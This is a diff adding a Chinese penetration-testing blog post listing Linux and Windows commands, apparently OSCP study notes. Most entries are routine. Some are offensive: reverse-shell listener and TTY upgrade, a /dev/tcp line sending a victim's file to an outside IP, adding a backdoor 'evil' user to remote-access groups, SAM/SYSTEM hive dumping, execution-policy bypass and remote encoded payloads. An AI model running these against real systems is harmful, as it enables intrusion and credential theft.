@@ -1,0 +1,786 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=&#34;auto&#34;>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/favicon-light.ico">
+  <link rel="icon" type="image/png" href="/img/favicon-light.ico">
+  <meta name="viewport"
+        content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+    <meta http-equiv="Content-Security-Policy" content="upgrade-insecure-requests">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="description" content="渗透测试笔记、日常问题记录">
+  <meta name="author" content="Ayu">
+  <meta name="keywords" content="">
+  <title>Tools &amp;&amp; Command - Black Book</title>
+
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.5.3/dist/css/bootstrap.min.css" />
+
+
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/github-markdown-css@4.0.0/github-markdown.min.css" />
+  <link  rel="stylesheet" href="/lib/hint/hint.min.css" />
+
+  
+    
+    
+      
+      <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/highlight.js@10.4.0/styles/dracula.min.css" />
+    
+  
+
+  
+    <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.css" />
+  
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_ba1fz6golrf.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_kmeydafke9r.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+<!-- 自定义样式保持在最底部 -->
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    var CONFIG = {"hostname":"0xhc.github.io","root":"/","version":"1.8.7","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"right","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"copy_btn":true,"image_zoom":{"enable":true},"toc":{"enable":true,"headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"onlypost":false},"web_analytics":{"enable":false,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null}}};
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+<meta name="generator" content="Hexo 5.3.0"></head>
+
+
+<body>
+  <header style="height: 70vh;">
+    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand"
+       href="/">&nbsp;<strong>Ayu's Blog</strong>&nbsp;</a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                首页
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                标签
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                分类
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                归档
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                关于
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" data-toggle="modal" data-target="#modalSearch">&nbsp;<i
+                class="iconfont icon-search"></i>&nbsp;</a>
+          </li>
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" href="javascript:">&nbsp;<i
+                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+    <div class="banner" id="banner" parallax=true
+         style="background: url('/assets/blog/84707606_p0.webp') no-repeat center center;
+           background-size: cover;">
+      <div class="full-bg-img">
+        <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+          <div class="page-header text-center fade-in-up">
+            <span class="h2" id="subtitle" title="Tools && Command">
+              
+            </span>
+
+            
+              <div class="mt-3">
+  
+  
+    <span class="post-meta">
+      <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+      <time datetime="2020-11-06 13:10" pubdate>
+        2020年11月6日 下午
+      </time>
+    </span>
+  
+</div>
+
+<div class="mt-1">
+  
+    
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-chart"></i>
+      2.9k 字
+    </span>
+  
+
+  
+    
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-clock-fill"></i>
+      
+      
+      57
+       分钟
+    </span>
+  
+
+  
+  
+</div>
+
+            
+          </div>
+
+          
+        </div>
+      </div>
+    </div>
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="d-none d-lg-block col-lg-2"></div>
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div class="py-5" id="board">
+          <article class="post-content mx-auto">
+            <!-- SEO header -->
+            <h1 style="display: none">Tools &amp;&amp; Command</h1>
+            
+            <div class="markdown-body">
+              <p>一些常用的工具和命令</p>
+<a id="more"></a>
+
+<h2 id="Linux"><a href="#Linux" class="headerlink" title="Linux"></a>Linux</h2><ul>
+<li>Base<ul>
+<li><code>:</code> split</li>
+<li>Python3 Creation of virtual environments</li>
+<li>OpenVPN</li>
+<li>Json validate and pretty-print(Python module)</li>
+<li>Json validate and pretty-print(jq command)</li>
+<li>rlwrap</li>
+<li>stty</li>
+<li>Multiple lines to one line</li>
+<li>rdesktop</li>
+<li>wget https</li>
+<li>nc prot scan</li>
+<li>Quick file transfer</li>
+</ul>
+</li>
+<li>awk</li>
+<li>sed</li>
+<li>mount</li>
+</ul>
+<br/>
+
+<p><code>:</code> split</p>
+<figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">cut -d <span class="hljs-string">&quot;:&quot;</span> -f 1<br></code></pre></div></td></tr></table></figure>
+<p>Python3 Creation of virtual environments</p>
+<figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">python3 -m venv $(<span class="hljs-built_in">pwd</span>)<br><span class="hljs-built_in">source</span> bin/activate<br><br><span class="hljs-comment"># exit</span><br>deactivate<br></code></pre></div></td></tr></table></figure>
+<p>OpenVPN</p>
+<figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">sudo openvpn --config OSCP-00000.ovpn --daemon<br></code></pre></div></td></tr></table></figure>
+<p>Json validate and pretty-print</p>
+<figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">python -m json.tool out.json <br><br>cat out.json | python -m json.tool<br></code></pre></div></td></tr></table></figure>
+<p>jq JSON validate and pretty-print</p>
+<figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash"><span class="hljs-comment"># ffuf ... -o output.json</span><br>cat output.json | jq <span class="hljs-string">&#x27;.results[0].url&#x27;</span><br></code></pre></div></td></tr></table></figure>
+<p>rlwrap</p>
+<figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">rlwrap nc -lvnp 9999<br></code></pre></div></td></tr></table></figure>
+<p>stty</p>
+<figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash"><span class="hljs-comment"># reverse shell tab 补全（体验更好的 reverse shell）</span><br><br><span class="hljs-comment"># 受控机器</span><br>python -c <span class="hljs-string">&#x27;import pty; pty.spawn(&quot;/bin/bash&quot;)&#x27;</span><br><br><span class="hljs-comment"># ^Z / Ctrl + z 切入后台</span><br>stty raw -<span class="hljs-built_in">echo</span><br><br><span class="hljs-comment"># 返回受控机器（fg 是看不见的）</span><br><span class="hljs-built_in">fg</span><br><br><span class="hljs-comment"># 按两次回车</span><br><span class="hljs-comment"># 设置受控机器 env</span><br><span class="hljs-built_in">export</span> TERM=xterm256-color<br></code></pre></div></td></tr></table></figure>
+<p>Multiple lines to one line</p>
+<figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash"><span class="hljs-comment"># 多行转一行</span><br>cat sqlserver.hash | xargs | sed -e <span class="hljs-string">&#x27;s/ //g&#x27;</span><br></code></pre></div></td></tr></table></figure>
+<p>rdesktop</p>
+<figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">rdesktop -u carol -p xxxxxxx 127.0.0.1 -r clipboard:CLIPBOARD -g 3584x2240@200<br></code></pre></div></td></tr></table></figure>
+<p>wget https</p>
+<figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">wget --no-check-certificate https://www.exploit-db.com/download/28806 -O 28806.zip<br></code></pre></div></td></tr></table></figure>
+<p>Nc Port Scan</p>
+<figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">nc -zvn -w 1 10.3.3.14 20-1000 2&gt;&amp;1 | tee port.txt<br></code></pre></div></td></tr></table></figure>
+<p>Quick file transfer</p>
+<figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash"><span class="hljs-comment"># Attack </span><br>nc -lvnp 4444 &gt; file<br><br><span class="hljs-comment"># Victim</span><br>cat file &gt; /dev/tcp/10.10.11.11/4444<br></code></pre></div></td></tr></table></figure>
+<h3 id="awk"><a href="#awk" class="headerlink" title="awk"></a>awk</h3><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">cat wordlists | awk <span class="hljs-string">&#x27;length($1) &gt; 4&#x27;</span><br></code></pre></div></td></tr></table></figure>
+<figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">awk <span class="hljs-string">&#x27;&#123;for(i=1;i&lt;=NF;i++)&#123;print $i&#125;&#125;&#x27;</span><br></code></pre></div></td></tr></table></figure>
+<figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash"><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;user:name&quot;</span> | awk -F: <span class="hljs-string">&#x27;&#123;print $1&#125;&#x27;</span><br></code></pre></div></td></tr></table></figure>
+<h3 id="sed"><a href="#sed" class="headerlink" title="sed"></a>sed</h3><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">head -4 useProt.txt <br><span class="hljs-comment">#    1 10000/tcp</span><br><span class="hljs-comment">#    1 10243/tcp</span><br><span class="hljs-comment">#    1 1026/tcp</span><br><span class="hljs-comment">#    1 1028/tcp</span><br><br>cat Prot.txt | awk <span class="hljs-string">&#x27;&#123;print $2&#125;&#x27;</span> | sort -un | xargs | sed -e <span class="hljs-string">&#x27;s/\/tcp//g&#x27;</span> | sed -e <span class="hljs-string">&#x27;s/ /, /g&#x27;</span><br><br><span class="hljs-comment"># 21, 22, 25, 53, 80, 88, 110, 111, 113, 119, 135, 139, 143 </span><br></code></pre></div></td></tr></table></figure>
+<p>删除 evil开头的那一行</p>
+<figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">sed -i <span class="hljs-string">&quot;/^evil/d&quot;</span> /etc/passwd<br></code></pre></div></td></tr></table></figure>
+<p>不显示 evil开头的那一行(原文件不变)</p>
+<figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">sed -e <span class="hljs-string">&quot;/^evil/d&quot;</span> /etc/passwd<br></code></pre></div></td></tr></table></figure>
+<p>替换包含 evil字符串的行(注意 /c)</p>
+<figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">sed -i <span class="hljs-string">&#x27;/evil/cevil:xxxx&#x27;</span> pass<br><br><span class="hljs-comment"># r : xxxx:evil</span><br><span class="hljs-comment"># n : evil:xxxx</span><br></code></pre></div></td></tr></table></figure>
+<h3 id="mount"><a href="#mount" class="headerlink" title="mount"></a>mount</h3><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">mount -t cifs -o user=luke //10.11.x.x/share /mnt/&lt;local_folder&gt;<br>mount -t cifs //10.11.x.x/<span class="hljs-string">&#x27;Bob Share&#x27;</span> /mnt/smb -o rw,vers=1.0,dir_mode=0777,file_mode=0666,nounix<br></code></pre></div></td></tr></table></figure>
+<br/>
+
+<h2 id="Windows"><a href="#Windows" class="headerlink" title="Windows"></a>Windows</h2><ul>
+<li>Base<ul>
+<li>PATH List</li>
+<li>Split string with</li>
+<li>Set Windows PATH For The Current Session</li>
+<li>rundll32</li>
+<li>cmdkey list</li>
+<li>service start/stop</li>
+<li>whoami</li>
+<li>Add users to the group</li>
+<li>look at the domain’s account policy(Low and Slow Password Guessing)</li>
+<li>delete file/folder</li>
+<li>findstr color</li>
+<li>where</li>
+<li>setspn</li>
+<li>tasklist</li>
+<li>firewall</li>
+<li>runas</li>
+<li>Extracting the SAM database</li>
+</ul>
+</li>
+<li>Powershell<ul>
+<li>Powershell Like Grep</li>
+<li>Powershell ExecutionPolicy</li>
+<li>Run command in backgroud</li>
+<li>Target architecture</li>
+<li>Copy to a remote computer</li>
+<li>Remote to local computer</li>
+<li>like <code>find . / ls -al</code></li>
+<li>PSCredential plain-text passwd</li>
+<li>New-PSDrive Remote Computer</li>
+<li>Port Scan</li>
+<li>Find Keyword</li>
+<li>Disable/Enable Windows Defender</li>
+</ul>
+</li>
+</ul>
+<br/>
+
+<p>PATH List</p>
+<figure class="highlight powershell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs powershell"><span class="hljs-built_in">echo</span> %PATH:;=&amp;<span class="hljs-built_in">echo</span>.%<br><br><span class="hljs-comment"># powershell</span><br><span class="hljs-variable">$env:PATH</span><br></code></pre></div></td></tr></table></figure>
+<p>Split string with</p>
+<figure class="highlight powershell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs powershell"><span class="hljs-variable">$p</span>=<span class="hljs-variable">$env:PATH</span><br><span class="hljs-variable">$p</span>.Split(<span class="hljs-string">&quot;;&quot;</span>)<br><br><span class="hljs-comment"># %SystemRoot%\system32\WindowsPowerShell\v1.0\</span><br><span class="hljs-comment"># C:\Windows\system32</span><br><span class="hljs-comment"># C:\Windows</span><br><span class="hljs-comment"># C:\Windows\System32\Wbem</span><br><span class="hljs-comment"># C:\Windows\System32\WindowsPowerShell\v1.0\</span><br></code></pre></div></td></tr></table></figure>
+<p>Set Windows PATH For The Current Session</p>
+<figure class="highlight powershell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs powershell"><span class="hljs-built_in">set</span> PATH=<span class="hljs-string">&quot;%PATH%;C:\path\to\directory\&quot;</span><br><br><span class="hljs-comment"># powershell</span><br><span class="hljs-variable">$env:PATH</span> += <span class="hljs-string">&quot;C:\Users\0x20C\Desktop\Pentest\Sigcheck\&quot;</span><br><br><span class="hljs-comment"># if Windows 7</span><br><span class="hljs-variable">$env:PATH</span> += <span class="hljs-string">&quot;;C:\Users\0x20C\Desktop\Pentest\Sigcheck\&quot;</span><br></code></pre></div></td></tr></table></figure>
+<p>rundll32</p>
+<figure class="highlight powershell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs powershell"><span class="hljs-comment"># dll, function name, arguments</span><br>rundll32.exe open_cmd_dll.dll,InvokeCmd<br></code></pre></div></td></tr></table></figure>
+<p>cmdkey list</p>
+<figure class="highlight powershell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs powershell">cmdkey /list<br></code></pre></div></td></tr></table></figure>
+<p>service start/stop</p>
+<figure class="highlight powershell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs powershell">net stop service &amp;&amp; net <span class="hljs-built_in">start</span> service<br></code></pre></div></td></tr></table></figure>
+<p>whoami</p>
+<figure class="highlight powershell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs powershell">whoami /groups<br><br>whoami /priv<br></code></pre></div></td></tr></table></figure>
+<p>Add users to the group</p>
+<figure class="highlight powershell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs powershell">net localgroup <span class="hljs-string">&quot;Remote Desktop users&quot;</span> evil /add<br>net localgroup  <span class="hljs-string">&quot;Debugger Users&quot;</span> evil /add<br><br><span class="hljs-comment"># winrm (evil-winrm)</span><br>net localgroup <span class="hljs-string">&quot;Remote Management Users&quot;</span> evil /add<br></code></pre></div></td></tr></table></figure>
+<p>look at the domain’s account policy</p>
+<figure class="highlight powershell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs powershell"><span class="hljs-comment"># Lockout threshold(锁定阈值)</span><br><span class="hljs-comment"># Lockout observation window (minutes)(锁定观察窗口)</span><br>net accounts<br><br><span class="hljs-comment"># Low and Slow Password Guessing</span><br><span class="hljs-comment"># Spray-Passwords.ps1</span><br></code></pre></div></td></tr></table></figure>
+<p>delete file/folder</p>
+<figure class="highlight powershell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs powershell"><span class="hljs-built_in">del</span> re.exe<br><span class="hljs-built_in">rd</span> /s /q C:\tools<br><br><span class="hljs-built_in">rd</span> folder<br></code></pre></div></td></tr></table></figure>
+<p>findstr color</p>
+<figure class="highlight powershell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs powershell">findstr /n /i /a:<span class="hljs-number">6</span> /s <span class="hljs-string">&quot;Password&quot;</span> config.xml<br></code></pre></div></td></tr></table></figure>
+<p>where</p>
+<figure class="highlight powershell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs powershell"><span class="hljs-built_in">where</span> /<span class="hljs-built_in">r</span> C:\windows eventvwr.exe<br><span class="hljs-comment"># C:\Windows\System32\eventvwr.exe</span><br><span class="hljs-comment"># C:\Windows\SysWOW64\eventvwr.exe</span><br></code></pre></div></td></tr></table></figure>
+<p>setspn</p>
+<figure class="highlight powershell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs powershell">setspn <span class="hljs-literal">-T</span> <span class="hljs-built_in">SV</span><span class="hljs-literal">-DC01</span> <span class="hljs-literal">-Q</span> */*<br></code></pre></div></td></tr></table></figure>
+<p>tasklist</p>
+<figure class="highlight powershell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs powershell">tasklist<br>taskkill /PID <span class="hljs-number">1864</span> /F<br>taskkill /im:shell.exe /f<br></code></pre></div></td></tr></table></figure>
+<p>firewall</p>
+<figure class="highlight powershell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs powershell">netsh firewall show state<br><span class="hljs-comment"># Port</span><br>netsh firewall show portopening<br>netsh firewall show currentprofile<br>netsh firewall show config<br></code></pre></div></td></tr></table></figure>
+<p>runas</p>
+<figure class="highlight powershell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs powershell">cmdkey /add:domain /user:USER /pass:PASS<br>cmdkey /delete:Domain:interactive=BETHANY\alice<br><br>runas /savecred /user:alias cmd.exe<br></code></pre></div></td></tr></table></figure>
+<p>Extracting the SAM database</p>
+<figure class="highlight powershell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs powershell">reg save hklm\sam C:\SAM<br>reg save hklm\system C:\SYSTEM<br>reg save hklm\security C:\SECURITY<br></code></pre></div></td></tr></table></figure>
+<br/>
+
+<h3 id="Powershell"><a href="#Powershell" class="headerlink" title="Powershell"></a>Powershell</h3><p>Powershell like grep</p>
+<figure class="highlight powershell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs powershell"><span class="hljs-built_in">Select-String</span> <span class="hljs-literal">-Pattern</span> <span class="hljs-string">&quot;requestedExecutionLevel&quot;</span> <span class="hljs-literal">-Context</span> <span class="hljs-number">0</span>,<span class="hljs-number">2</span><br></code></pre></div></td></tr></table></figure>
+<p>Powershell ExecutionPolicy</p>
+<figure class="highlight powershell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs powershell">powershell.exe <span class="hljs-literal">-Nop</span> <span class="hljs-literal">-ExecutionPolicy</span> Bypass <span class="hljs-operator">-File</span> C:\Windows\System32\spool\drivers\color\ps.ps1<br>powershell.exe <span class="hljs-literal">-Nop</span> <span class="hljs-literal">-ep</span> Bypass <span class="hljs-operator">-File</span> C:\Windows\System32\spool\drivers\color\ps.ps1<br></code></pre></div></td></tr></table></figure>
+<p>Run command in backgroud</p>
+<figure class="highlight powershell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs powershell"><span class="hljs-comment"># cmd</span><br><span class="hljs-built_in">start</span> /b powershell <span class="hljs-literal">-nop</span> <span class="hljs-literal">-enc</span> SQBFA...<br><br><span class="hljs-comment"># powershell</span><br><span class="hljs-comment"># Invoke-Command -AsJob</span><br><span class="hljs-built_in">Invoke-Command</span> <span class="hljs-literal">-AsJob</span> <span class="hljs-literal">-ComputerName</span> XOR<span class="hljs-literal">-APP23</span> <span class="hljs-literal">-Credential</span> <span class="hljs-variable">$crel</span> <span class="hljs-literal">-ScriptBlock</span> &#123; powershell <span class="hljs-literal">-nop</span> <span class="hljs-literal">-enc</span> SQB... &#125;<br><br><span class="hljs-comment"># Jobs list</span><br><span class="hljs-built_in">Get-Job</span><br></code></pre></div></td></tr></table></figure>
+<p>Target architecture</p>
+<figure class="highlight powershell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs powershell"><span class="hljs-variable">$ENV:PROCESSOR_ARCHITECTURE</span><br><br>[<span class="hljs-built_in">Int</span><span class="hljs-type">Ptr</span>]::Size<br><span class="hljs-comment"># 4 =&gt; 32bit</span><br><span class="hljs-comment"># 8 =&gt; 64bit</span><br></code></pre></div></td></tr></table></figure>
+<figure class="highlight powershell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs powershell"><span class="hljs-variable">$session</span> = <span class="hljs-built_in">New-PSSession</span> <span class="hljs-literal">-ComputerName</span> XOR<span class="hljs-literal">-APP23</span> <span class="hljs-literal">-Credential</span> <span class="hljs-variable">$crel</span><br><br><span class="hljs-built_in">Get-PSSession</span><br></code></pre></div></td></tr></table></figure>
+<p>Copy to a remote computer</p>
